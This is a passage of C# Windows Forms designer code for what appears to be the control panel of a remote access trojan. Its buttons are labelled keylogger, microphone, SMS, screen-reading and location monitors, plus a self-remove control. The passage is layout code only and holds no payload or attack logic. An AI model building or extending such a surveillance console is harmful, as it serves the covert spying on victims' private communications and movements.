            this.uncheckbtn.TabIndex = 29;
            this.notifiform.SetToolTip(this.uncheckbtn, "un-select client");
            this.uncheckbtn.Visible = false;
            this.uncheckbtn.Click += new System.EventHandler(this.B_ok_Click);
            // 
            // DrakeUIAvatar1
            // 
            this.DrakeUIAvatar1.AvatarSize = 25;
            this.DrakeUIAvatar1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar1.Dock = System.Windows.Forms.DockStyle.Left;
            this.DrakeUIAvatar1.FillColor = System.Drawing.Color.Black;
            this.DrakeUIAvatar1.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIAvatar1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar1.Location = new System.Drawing.Point(45, 0);
            this.DrakeUIAvatar1.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIAvatar1.Name = "DrakeUIAvatar1";
            this.DrakeUIAvatar1.Size = new System.Drawing.Size(45, 33);
            this.DrakeUIAvatar1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar1.StyleCustomMode = true;
            this.DrakeUIAvatar1.Symbol = 61508;
            this.DrakeUIAvatar1.SymbolSize = 25;
            this.DrakeUIAvatar1.TabIndex = 34;
            this.notifiform.SetToolTip(this.DrakeUIAvatar1, "Edit Clients information");
            this.DrakeUIAvatar1.Click += new System.EventHandler(this.DrakeUIAvatar1_Click_1);
            // 
            // clearsrchbtn
            // 
            this.clearsrchbtn.AvatarSize = 25;
            this.clearsrchbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.clearsrchbtn.Dock = System.Windows.Forms.DockStyle.Left;
            this.clearsrchbtn.FillColor = System.Drawing.Color.Black;
            this.clearsrchbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.clearsrchbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.clearsrchbtn.Location = new System.Drawing.Point(487, 0);
            this.clearsrchbtn.Margin = new System.Windows.Forms.Padding(4);
            this.clearsrchbtn.Name = "clearsrchbtn";
            this.clearsrchbtn.Size = new System.Drawing.Size(29, 33);
            this.clearsrchbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.clearsrchbtn.StyleCustomMode = true;
            this.clearsrchbtn.Symbol = 77;
            this.clearsrchbtn.SymbolSize = 33;
            this.clearsrchbtn.TabIndex = 33;
            this.clearsrchbtn.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.notifiform.SetToolTip(this.clearsrchbtn, "Clear Search");
            this.clearsrchbtn.Visible = false;
            this.clearsrchbtn.Click += new System.EventHandler(this.Clearsrchbtn_Click);
            // 
            // smsbtn
            // 
            this.smsbtn.CircleRectWidth = 30;
            this.smsbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.smsbtn.FillColor = System.Drawing.Color.Black;
            this.smsbtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.smsbtn.FillPressColor = System.Drawing.Color.Black;
            this.smsbtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.smsbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.smsbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.smsbtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.smsbtn.Location = new System.Drawing.Point(11, 97);
            this.smsbtn.Margin = new System.Windows.Forms.Padding(4);
            this.smsbtn.Name = "smsbtn";
            this.smsbtn.RectColor = System.Drawing.Color.Black;
            this.smsbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.smsbtn.RectHoverColor = System.Drawing.Color.White;
            this.smsbtn.RectPressColor = System.Drawing.Color.White;
            this.smsbtn.RectSelectedColor = System.Drawing.Color.White;
            this.smsbtn.Size = new System.Drawing.Size(41, 33);
            this.smsbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.smsbtn.StyleCustomMode = true;
            this.smsbtn.Symbol = 61664;
            this.smsbtn.SymbolSize = 30;
            this.smsbtn.TabIndex = 18;
            this.notifiform.SetToolTip(this.smsbtn, "SMS Manager");
            this.smsbtn.Click += new System.EventHandler(this.Smsbtn_Click);
            // 
            // DrakeUIButtonIcon5
            // 
            this.DrakeUIButtonIcon5.CircleRectWidth = 30;
            this.DrakeUIButtonIcon5.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon5.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon5.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.DrakeUIButtonIcon5.Font = new System.Drawing.Font("Calibri", 9.5F);
            this.DrakeUIButtonIcon5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon5.Location = new System.Drawing.Point(261, 97);
            this.DrakeUIButtonIcon5.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIButtonIcon5.Name = "DrakeUIButtonIcon5";
            this.DrakeUIButtonIcon5.RectColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon5.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon5.RectHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon5.RectPressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon5.RectSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon5.Size = new System.Drawing.Size(41, 33);
            this.DrakeUIButtonIcon5.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon5.StyleCustomMode = true;
            this.DrakeUIButtonIcon5.Symbol = 61944;
            this.DrakeUIButtonIcon5.SymbolSize = 30;
            this.DrakeUIButtonIcon5.TabIndex = 35;
            this.notifiform.SetToolTip(this.DrakeUIButtonIcon5, "Self Remove");
            this.DrakeUIButtonIcon5.Click += new System.EventHandler(this.DrakeUIButtonIcon5_Click);
            // 
            // keyloggerbtn
            // 
            this.keyloggerbtn.CircleRectWidth = 30;
            this.keyloggerbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.keyloggerbtn.FillColor = System.Drawing.Color.Black;
            this.keyloggerbtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.keyloggerbtn.FillPressColor = System.Drawing.Color.Black;
            this.keyloggerbtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.keyloggerbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.keyloggerbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.keyloggerbtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.keyloggerbtn.Location = new System.Drawing.Point(11, 57);
            this.keyloggerbtn.Margin = new System.Windows.Forms.Padding(4);
            this.keyloggerbtn.Name = "keyloggerbtn";
            this.keyloggerbtn.RectColor = System.Drawing.Color.Black;
            this.keyloggerbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.keyloggerbtn.RectHoverColor = System.Drawing.Color.White;
            this.keyloggerbtn.RectPressColor = System.Drawing.Color.White;
            this.keyloggerbtn.RectSelectedColor = System.Drawing.Color.White;
            this.keyloggerbtn.Size = new System.Drawing.Size(41, 33);
            this.keyloggerbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.keyloggerbtn.StyleCustomMode = true;
            this.keyloggerbtn.Symbol = 61724;
            this.keyloggerbtn.SymbolSize = 30;
            this.keyloggerbtn.TabIndex = 21;
            this.notifiform.SetToolTip(this.keyloggerbtn, "Keylogger Monitor");
            this.keyloggerbtn.Click += new System.EventHandler(this.Keyloggerbtn_Click);
            // 
            // applicationsbtn
            // 
            this.applicationsbtn.CircleRectWidth = 30;
            this.applicationsbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.applicationsbtn.FillColor = System.Drawing.Color.Black;
            this.applicationsbtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.applicationsbtn.FillPressColor = System.Drawing.Color.Black;
            this.applicationsbtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.applicationsbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.applicationsbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.applicationsbtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.applicationsbtn.Location = new System.Drawing.Point(361, 57);
            this.applicationsbtn.Margin = new System.Windows.Forms.Padding(4);
            this.applicationsbtn.Name = "applicationsbtn";
            this.applicationsbtn.RectColor = System.Drawing.Color.Black;
            this.applicationsbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.applicationsbtn.RectHoverColor = System.Drawing.Color.White;
            this.applicationsbtn.RectPressColor = System.Drawing.Color.White;
            this.applicationsbtn.RectSelectedColor = System.Drawing.Color.White;
            this.applicationsbtn.Size = new System.Drawing.Size(41, 33);
            this.applicationsbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.applicationsbtn.StyleCustomMode = true;
            this.applicationsbtn.Symbol = 61819;
            this.applicationsbtn.SymbolSize = 30;
            this.applicationsbtn.TabIndex = 20;
            this.notifiform.SetToolTip(this.applicationsbtn, "Applications");
            this.applicationsbtn.Click += new System.EventHandler(this.Applicationsbtn_Click);
            // 
            // DrakeUIButtonIcon20
            // 
            this.DrakeUIButtonIcon20.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon20.Dock = System.Windows.Forms.DockStyle.Top;
            this.DrakeUIButtonIcon20.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon20.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.DrakeUIButtonIcon20.Font = new System.Drawing.Font("Calibri", 9F);
            this.DrakeUIButtonIcon20.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon20.Location = new System.Drawing.Point(0, 0);
            this.DrakeUIButtonIcon20.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIButtonIcon20.Name = "DrakeUIButtonIcon20";
            this.DrakeUIButtonIcon20.RectColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon20.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon20.RectHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon20.RectPressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon20.RectSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon20.Size = new System.Drawing.Size(421, 43);
            this.DrakeUIButtonIcon20.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon20.StyleCustomMode = true;
            this.DrakeUIButtonIcon20.Symbol = 61527;
            this.DrakeUIButtonIcon20.SymbolSize = 25;
            this.DrakeUIButtonIcon20.TabIndex = 33;
            this.notifiform.SetToolTip(this.DrakeUIButtonIcon20, "Exit");
            this.DrakeUIButtonIcon20.Click += new System.EventHandler(this.DrakeUIButtonIcon20_Click);
            // 
            // DrakeUIAvatar11
            // 
            this.DrakeUIAvatar11.AvatarSize = 25;
            this.DrakeUIAvatar11.BackColor = System.Drawing.Color.Black;
            this.DrakeUIAvatar11.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar11.Dock = System.Windows.Forms.DockStyle.Left;
            this.DrakeUIAvatar11.FillColor = System.Drawing.Color.Black;
            this.DrakeUIAvatar11.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIAvatar11.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar11.Location = new System.Drawing.Point(0, 0);
            this.DrakeUIAvatar11.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIAvatar11.Name = "DrakeUIAvatar11";
            this.DrakeUIAvatar11.Size = new System.Drawing.Size(35, 32);
            this.DrakeUIAvatar11.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar11.StyleCustomMode = true;
            this.DrakeUIAvatar11.Symbol = 61561;
            this.DrakeUIAvatar11.SymbolSize = 25;
            this.DrakeUIAvatar11.TabIndex = 36;
            this.notifiform.SetToolTip(this.DrakeUIAvatar11, "Refresh");
            this.DrakeUIAvatar11.Click += new System.EventHandler(this.DrakeUIAvatar11_Click);
            // 
            // FWstatus
            // 
            this.FWstatus.AvatarSize = 25;
            this.FWstatus.Cursor = System.Windows.Forms.Cursors.Default;
            this.FWstatus.Dock = System.Windows.Forms.DockStyle.Right;
            this.FWstatus.FillColor = System.Drawing.Color.Black;
            this.FWstatus.Font = new System.Drawing.Font("Calibri", 12F);
            this.FWstatus.ForeColor = System.Drawing.Color.Red;
            this.FWstatus.Location = new System.Drawing.Point(394, 0);
            this.FWstatus.Margin = new System.Windows.Forms.Padding(4);
            this.FWstatus.Name = "FWstatus";
            this.FWstatus.Size = new System.Drawing.Size(27, 500);
            this.FWstatus.Style = DrakeUI.Framework.UIStyle.Custom;
            this.FWstatus.StyleCustomMode = true;
            this.FWstatus.Symbol = 61713;
            this.FWstatus.SymbolSize = 25;
            this.FWstatus.TabIndex = 39;
            this.notifiform.SetToolTip(this.FWstatus, "Firewall Status");
            // 
            // DrakeUIAvatar8
            // 
            this.DrakeUIAvatar8.AvatarSize = 25;
            this.DrakeUIAvatar8.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar8.FillColor = System.Drawing.Color.Black;
            this.DrakeUIAvatar8.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIAvatar8.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar8.Location = new System.Drawing.Point(371, 223);
            this.DrakeUIAvatar8.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIAvatar8.Name = "DrakeUIAvatar8";
            this.DrakeUIAvatar8.Size = new System.Drawing.Size(76, 39);
            this.DrakeUIAvatar8.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar8.StyleCustomMode = true;
            this.DrakeUIAvatar8.Symbol = 61764;
            this.DrakeUIAvatar8.SymbolSize = 25;
            this.DrakeUIAvatar8.TabIndex = 37;
            this.notifiform.SetToolTip(this.DrakeUIAvatar8, "Start");
            this.DrakeUIAvatar8.Click += new System.EventHandler(this.DrakeUIAvatar8_Click_1);
            // 
            // DrakeUIAvatar5
            // 
            this.DrakeUIAvatar5.AvatarSize = 25;
            this.DrakeUIAvatar5.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar5.Dock = System.Windows.Forms.DockStyle.Left;
            this.DrakeUIAvatar5.FillColor = System.Drawing.Color.Black;
            this.DrakeUIAvatar5.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIAvatar5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar5.Location = new System.Drawing.Point(0, 0);
            this.DrakeUIAvatar5.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIAvatar5.Name = "DrakeUIAvatar5";
            this.DrakeUIAvatar5.Size = new System.Drawing.Size(35, 500);
            this.DrakeUIAvatar5.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar5.StyleCustomMode = true;
            this.DrakeUIAvatar5.Symbol = 61561;
            this.DrakeUIAvatar5.SymbolSize = 25;
            this.DrakeUIAvatar5.TabIndex = 36;
            this.notifiform.SetToolTip(this.DrakeUIAvatar5, "Refresh");
            this.DrakeUIAvatar5.Click += new System.EventHandler(this.DrakeUIAvatar5_Click_1);
            // 
            // DrakeUIAvatar9
            // 
            this.DrakeUIAvatar9.AvatarSize = 25;
            this.DrakeUIAvatar9.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar9.Dock = System.Windows.Forms.DockStyle.Left;
            this.DrakeUIAvatar9.FillColor = System.Drawing.Color.Black;
            this.DrakeUIAvatar9.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIAvatar9.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar9.Location = new System.Drawing.Point(35, 0);
            this.DrakeUIAvatar9.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIAvatar9.Name = "DrakeUIAvatar9";
            this.DrakeUIAvatar9.Size = new System.Drawing.Size(35, 500);
            this.DrakeUIAvatar9.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar9.StyleCustomMode = true;
            this.DrakeUIAvatar9.Symbol = 62093;
            this.DrakeUIAvatar9.SymbolSize = 25;
            this.DrakeUIAvatar9.TabIndex = 38;
            this.notifiform.SetToolTip(this.DrakeUIAvatar9, "Stop");
            this.DrakeUIAvatar9.Click += new System.EventHandler(this.DrakeUIAvatar9_Click_1);
            // 
            // lastclientpic
            // 
            this.lastclientpic.BackColor = System.Drawing.Color.Transparent;
            this.lastclientpic.Cursor = System.Windows.Forms.Cursors.Hand;
            this.lastclientpic.Dock = System.Windows.Forms.DockStyle.Right;
            this.lastclientpic.FillColor = System.Drawing.Color.Transparent;
            this.lastclientpic.Font = new System.Drawing.Font("Calibri", 12F);
            this.lastclientpic.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.lastclientpic.Location = new System.Drawing.Point(177, 39);
            this.lastclientpic.Margin = new System.Windows.Forms.Padding(4);
            this.lastclientpic.Name = "lastclientpic";
            this.lastclientpic.Size = new System.Drawing.Size(76, 83);
            this.lastclientpic.Style = DrakeUI.Framework.UIStyle.Custom;
            this.lastclientpic.StyleCustomMode = true;
            this.lastclientpic.Symbol = 62004;
            this.lastclientpic.SymbolSize = 55;
            this.lastclientpic.TabIndex = 12;
            this.lastclientpic.Text = "DrakeUIAvatar8";
            this.notifiform.SetToolTip(this.lastclientpic, "Logs");
            // 
            // DrakeUIButtonIcon6
            // 
            this.DrakeUIButtonIcon6.CircleRectWidth = 30;
            this.DrakeUIButtonIcon6.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon6.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon6.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.DrakeUIButtonIcon6.Font = new System.Drawing.Font("Calibri", 9.5F);
            this.DrakeUIButtonIcon6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon6.Location = new System.Drawing.Point(211, 97);
            this.DrakeUIButtonIcon6.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIButtonIcon6.Name = "DrakeUIButtonIcon6";
            this.DrakeUIButtonIcon6.RectColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon6.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon6.RectHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon6.RectPressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon6.RectSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon6.Size = new System.Drawing.Size(41, 33);
            this.DrakeUIButtonIcon6.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon6.StyleCustomMode = true;
            this.DrakeUIButtonIcon6.Symbol = 62075;
            this.DrakeUIButtonIcon6.SymbolSize = 30;
            this.DrakeUIButtonIcon6.TabIndex = 36;
            this.notifiform.SetToolTip(this.DrakeUIButtonIcon6, "Show Message");
            this.DrakeUIButtonIcon6.Click += new System.EventHandler(this.DrakeUIButtonIcon6_Click_1);
            // 
            // locationbtn
            // 
            this.locationbtn.CircleRectWidth = 30;
            this.locationbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.locationbtn.FillColor = System.Drawing.Color.Black;
            this.locationbtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.locationbtn.FillPressColor = System.Drawing.Color.Black;
            this.locationbtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.locationbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.locationbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.locationbtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.locationbtn.Location = new System.Drawing.Point(311, 97);
            this.locationbtn.Margin = new System.Windows.Forms.Padding(4);
            this.locationbtn.Name = "locationbtn";
            this.locationbtn.RectColor = System.Drawing.Color.Black;
            this.locationbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.locationbtn.RectHoverColor = System.Drawing.Color.White;
            this.locationbtn.RectPressColor = System.Drawing.Color.White;
            this.locationbtn.RectSelectedColor = System.Drawing.Color.White;
            this.locationbtn.Size = new System.Drawing.Size(41, 33);
            this.locationbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.locationbtn.StyleCustomMode = true;
            this.locationbtn.Symbol = 61505;
            this.locationbtn.SymbolSize = 30;
            this.locationbtn.TabIndex = 22;
            this.notifiform.SetToolTip(this.locationbtn, "Location Manager");
            this.locationbtn.Click += new System.EventHandler(this.Locationbtn_Click);
            // 
            // screenreadbtn
            // 
            this.screenreadbtn.CircleRectWidth = 30;
            this.screenreadbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.screenreadbtn.FillColor = System.Drawing.Color.Black;
            this.screenreadbtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.screenreadbtn.FillPressColor = System.Drawing.Color.Black;
            this.screenreadbtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.screenreadbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.screenreadbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.screenreadbtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.screenreadbtn.Location = new System.Drawing.Point(284, 15);
            this.screenreadbtn.Margin = new System.Windows.Forms.Padding(4);
            this.screenreadbtn.Name = "screenreadbtn";
            this.screenreadbtn.RectColor = System.Drawing.Color.Black;
            this.screenreadbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.screenreadbtn.RectHoverColor = System.Drawing.Color.White;
            this.screenreadbtn.RectPressColor = System.Drawing.Color.White;
            this.screenreadbtn.RectSelectedColor = System.Drawing.Color.White;
            this.screenreadbtn.Size = new System.Drawing.Size(41, 33);
            this.screenreadbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.screenreadbtn.StyleCustomMode = true;
            this.screenreadbtn.Symbol = 61450;
            this.screenreadbtn.SymbolSize = 30;
            this.screenreadbtn.TabIndex = 18;
            this.notifiform.SetToolTip(this.screenreadbtn, "Screen Reader V2");
            this.screenreadbtn.Click += new System.EventHandler(this.Screenreadbtn_Click);
            // 
            // micbtn
            // 
            this.micbtn.CircleRectWidth = 30;
            this.micbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.micbtn.FillColor = System.Drawing.Color.Black;
            this.micbtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.micbtn.FillPressColor = System.Drawing.Color.Black;
            this.micbtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.micbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.micbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.micbtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.micbtn.Location = new System.Drawing.Point(233, 15);
            this.micbtn.Margin = new System.Windows.Forms.Padding(4);
            this.micbtn.Name = "micbtn";
            this.micbtn.RectColor = System.Drawing.Color.Black;
            this.micbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.micbtn.RectHoverColor = System.Drawing.Color.White;
            this.micbtn.RectPressColor = System.Drawing.Color.White;
            this.micbtn.RectSelectedColor = System.Drawing.Color.White;
            this.micbtn.Size = new System.Drawing.Size(41, 33);
            this.micbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.micbtn.StyleCustomMode = true;
            this.micbtn.Symbol = 57471;
            this.micbtn.SymbolSize = 30;
            this.micbtn.TabIndex = 20;
            this.notifiform.SetToolTip(this.micbtn, "Microphone Monitor");
            this.micbtn.Click += new System.EventHandler(this.Micbtn_Click);
            // 
            // ToolTips
            // 
            this.ToolTips.BackColor = System.Drawing.Color.Black;
            this.ToolTips.ForeColor = System.Drawing.Color.White;
            this.ToolTips.OwnerDraw = true;
            this.ToolTips.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            // 
            // addpo
            // 
            this.addpo.AvatarSize = 30;
            this.addpo.BackColor = System.Drawing.Color.Transparent;
            this.addpo.Cursor = System.Windows.Forms.Cursors.Hand;
            this.addpo.FillColor = System.Drawing.Color.Black;
            this.addpo.Font = new System.Drawing.Font("Calibri", 12F);
            this.addpo.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.addpo.Location = new System.Drawing.Point(2365, 0);
            this.addpo.Margin = new System.Windows.Forms.Padding(4);
            this.addpo.Name = "addpo";
            this.addpo.Size = new System.Drawing.Size(35, 44);
            this.addpo.Style = DrakeUI.Framework.UIStyle.Custom;
            this.addpo.StyleCustomMode = true;
            this.addpo.Symbol = 61525;
            this.addpo.SymbolSize = 30;
            this.addpo.TabIndex = 45;
            this.addpo.Text = "DrakeUIAvatar1";
            this.ToolTips.SetToolTip(this.addpo, "Add to Block");
            this.addpo.Click += new System.EventHandler(this.Addpo_Click);
            // 
            // checkupdate
            // 
            this.checkupdate.Interval = 1000;
            this.checkupdate.Tick += new System.EventHandler(this.Checkupdate_Tick);
            // 
            // mapworker
            // 
            this.mapworker.DoWork += new System.ComponentModel.DoWorkEventHandler(this.Mapworker_DoWork_1);
            // 
            // Statustimer
            // 
            this.Statustimer.Interval = 1000;
            this.Statustimer.Tick += new System.EventHandler(this.Statustimer_Tick);
            // 
            // ImageList1
            // 
